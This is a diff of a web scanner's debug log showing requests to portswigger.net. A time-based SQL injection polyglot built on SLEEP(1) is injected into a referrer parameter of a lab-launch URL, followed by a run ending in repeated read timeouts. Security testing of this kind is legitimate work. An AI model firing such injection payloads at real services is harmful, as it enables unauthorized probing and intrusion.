@@ -1024,3 +1024,13 @@
 2024-08-01 19:59:42,685 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
 2024-08-01 19:59:45,209 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputSLEEP(1)/*'%20or%20SLEEP(1)%20or%20'%22%20or%20SLEEP(1)%20or%20%22*/ HTTP/1.1" 200 None
 2024-08-01 19:59:46,672 - INFO - [19:59:46] Payload testing: SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/
+2024-08-02 22:29:10,719 - INFO - Starting testing...
+2024-08-02 22:29:10,739 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-02 22:29:13,772 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input1 HTTP/1.1" 200 None
+2024-08-02 22:29:15,575 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-02 22:29:29,951 - INFO - Error making request: HTTPSConnectionPool(host='portswigger.net', port=443): Read timed out. (read timeout=10)
+2024-08-02 22:29:29,958 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-02 22:29:42,070 - INFO - Error making request: HTTPSConnectionPool(host='portswigger.net', port=443): Read timed out. (read timeout=10)
+2024-08-02 22:29:42,074 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-02 22:29:54,432 - INFO - Error making request: HTTPSConnectionPool(host='portswigger.net', port=443): Read timed out. (read timeout=10)
+2024-08-02 22:29:54,435 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
